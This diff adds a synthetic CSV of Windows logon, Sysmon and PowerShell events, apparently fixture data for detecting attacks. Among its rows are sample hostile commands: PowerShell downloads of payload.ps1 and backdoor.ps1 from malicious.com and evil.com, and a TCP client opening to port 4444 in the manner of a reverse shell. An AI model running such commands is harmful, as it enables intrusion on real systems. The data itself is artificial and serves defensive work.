@@ -1,0 +1,51 @@
+EventID,SystemTime,TargetUserName,IpAddress,WorkstationName,ProcessName,EventDescription,ScriptContent,SourcePort,DestinationPort
+4624,2025-05-15T16:29:00.123456,Administrator,127.0.0.1,SRV01,-,Successful Logon (Local),-,-,-
+4625,2025-05-15T16:29:01.123456,Administrator,192.168.1.100,ATTACKER-WK01,-,Failed Logon Attempt (Invalid Password),-,-,-
+4625,2025-05-15T16:29:01.234567,Administrator,192.168.1.100,ATTACKER-WK01,-,Failed Logon Attempt (Invalid Password),-,-,-
+4624,2025-05-15T16:29:01.345678,IEUser,192.168.1.10,WKSTN01,-,Successful Logon (Network),-,-,-
+4625,2025-05-15T16:29:01.456789,Guest,172.16.0.50,REMOTE-PC01,-,Failed Logon Attempt (Account Disabled),-,-,-
+4625,2025-05-15T16:29:01.567890,TestUser,10.0.2.15,PC01,-,Failed Logon Attempt (Invalid Username),-,-,-
+4104,2025-05-15T16:29:10.678901,IEUser,-,SRV01,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,PowerShell Script Execution,Get-Service | Where-Object {$_.Status -eq 'Running'},-,-
+1,2025-05-15T16:29:15.789012,IEUser,-,SRV01,C:\Windows\explorer.exe,Sysmon Process Create,C:\Windows\explorer.exe,-,-
+4104,2025-05-15T16:29:20.890123,IEUser,-,SRV01,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,PowerShell Script Execution,Invoke-WebRequest -Uri http://malicious.com/payload.ps1 -OutFile C:\Temp\payload.ps1,-,-
+5156,2025-05-15T16:29:30.901234,-,192.168.1.200,BOTNET-PC01,-,Network Connection (Potential DDoS),-,54321,80
+5156,2025-05-15T16:29:30.902345,-,192.168.1.200,BOTNET-PC01,-,Network Connection (Potential DDoS),-,54322,80
+5156,2025-05-15T16:29:30.903456,-,192.168.1.200,BOTNET-PC01,-,Network Connection (Potential DDoS),-,54323,80
+5156,2025-05-15T16:29:30.904567,-,192.168.1.10,WKSTN01,-,Network Connection (HTTP Request),-,54324,80
+4625,2025-05-15T16:29:31.012345,Administrator,192.168.1.100,ATTACKER-WK01,-,Failed Logon Attempt (Invalid Password),-,-,-
+4624,2025-05-15T16:29:31.123456,LocalUser,192.168.1.20,WKSTN02,-,Successful Logon (Network),-,-,-
+4625,2025-05-15T16:29:31.234567,Administrator,203.0.113.10,ATTACKER-WK02,-,Failed Logon Attempt (Invalid Password),-,-,-
+4625,2025-05-15T16:29:31.345678,Guest,172.16.0.50,REMOTE-PC01,-,Failed Logon Attempt (Account Disabled),-,-,-
+4104,2025-05-15T16:29:35.456789,TestUser,-,SRV01,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,PowerShell Script Execution,New-Object System.Net.Sockets.TCPClient('192.168.1.1',4444),-,-
+5156,2025-05-15T16:29:40.567890,-,192.168.1.200,BOTNET-PC01,-,Network Connection (Potential DDoS),-,54325,80
+5156,2025-05-15T16:29:40.678901,-,192.168.1.200,BOTNET-PC01,-,Network Connection (Potential DDoS),-,54326,80
+5156,2025-05-15T16:29:40.789012,-,192.168.1.201,BOTNET-PC02,-,Network Connection (Potential DDoS),-,54327,80
+5156,2025-05-15T16:29:40.890123,-,192.168.1.10,WKSTN01,-,Network Connection (RDP),-,54328,3389
+4625,2025-05-15T16:29:41.012345,Administrator,192.168.1.100,ATTACKER-WK01,-,Failed Logon Attempt (Invalid Password),-,-,-
+4624,2025-05-15T16:29:41.123456,Administrator,127.0.0.1,SRV01,-,Successful Logon (Local),-,-,-
+4104,2025-05-15T16:29:45.234567,IEUser,-,SRV01,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,PowerShell Script Execution,Get-WmiObject -Class Win32_ComputerSystem,-,-
+5156,2025-05-15T16:29:50.345678,-,192.168.1.200,BOTNET-PC01,-,Network Connection (Potential DDoS),-,54329,80
+5156,2025-05-15T16:29:50.456789,-,192.168.1.200,BOTNET-PC01,-,Network Connection (Potential DDoS),-,54330,80
+5156,2025-05-15T16:29:50.567890,-,192.168.1.201,BOTNET-PC02,-,Network Connection (Potential DDoS),-,54331,80
+5156,2025-05-15T16:29:50.678901,-,192.168.1.20,WKSTN02,-,Network Connection (HTTP Request),-,54332,80
+4625,2025-05-15T16:29:51.789012,Administrator,192.168.1.100,ATTACKER-WK01,-,Failed Logon Attempt (Invalid Password),-,-,-
+4625,2025-05-15T16:29:51.890123,Guest,172.16.0.50,REMOTE-PC01,-,Failed Logon Attempt (Account Disabled),-,-,-
+4104,2025-05-15T16:29:55.901234,TestUser,-,SRV01,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,PowerShell Script Execution,Invoke-Command -ScriptBlock {whoami} -ComputerName SRV02,-,-
+5156,2025-05-15T16:30:00.012345,-,192.168.1.200,BOTNET-PC01,-,Network Connection (Potential DDoS),-,54333,80
+5156,2025-05-15T16:30:00.123456,-,192.168.1.200,BOTNET-PC01,-,Network Connection (Potential DDoS),-,54334,80
+5156,2025-05-15T16:30:00.234567,-,192.168.1.201,BOTNET-PC02,-,Network Connection (Potential DDoS),-,54335,80
+5156,2025-05-15T16:30:00.345678,-,192.168.1.10,WKSTN01,-,Network Connection (HTTP Request),-,54336,80
+4624,2025-05-15T16:30:01.456789,IEUser,192.168.1.10,WKSTN01,-,Successful Logon (Network),-,-,-
+4625,2025-05-15T16:30:01.567890,Administrator,192.168.1.100,ATTACKER-WK01,-,Failed Logon Attempt (Invalid Password),-,-,-
+4104,2025-05-15T16:30:05.678901,LocalUser,-,SRV01,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,PowerShell Script Execution,Get-EventLog -LogName System | Where-Object {$_.EventID -eq 6009},-,-
+5156,2025-05-15T16:30:10.789012,-,192.168.1.200,BOTNET-PC01,-,Network Connection (Potential DDoS),-,54337,80
+5156,2025-05-15T16:30:10.890123,-,192.168.1.200,BOTNET-PC01,-,Network Connection (Potential DDoS),-,54338,80
+5156,2025-05-15T16:30:10.901234,-,192.168.1.201,BOTNET-PC02,-,Network Connection (Potential DDoS),-,54339,80
+5156,2025-05-15T16:30:10.012345,-,192.168.1.20,WKSTN02,-,Network Connection (RDP),-,54340,3389
+4625,2025-05-15T16:30:11.123456,Administrator,203.0.113.10,ATTACKER-WK02,-,Failed Logon Attempt (Invalid Password),-,-,-
+4624,2025-05-15T16:30:11.234567,LocalUser,192.168.1.20,WKSTN02,-,Successful Logon (Network),-,-,-
+4104,2025-05-15T16:30:15.345678,TestUser,-,SRV01,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,PowerShell Script Execution,Invoke-WebRequest -Uri http://evil.com/backdoor.ps1 -OutFile C:\Temp\backdoor.ps1,-,-
+1,2025-05-15T16:30:15.456789,IEUser,-,SRV01,C:\Windows\System32\notepad.exe,Sysmon Process Create,C:\Windows\System32\notepad.exe,-,-
+5156,2025-05-15T16:30:20.567890,-,192.168.1.200,BOTNET-PC01,-,Network Connection (Potential DDoS),-,54341,80
+5156,2025-05-15T16:30:20.678901,-,192.168.1.200,BOTNET-PC01,-,Network Connection (Potential DDoS),-,54342,80
+5156,2025-05-15T16:30:20.789012,-,192.168.1.201,BOTNET-PC02,-,Network Connection (Potential DDoS),-,54343,80
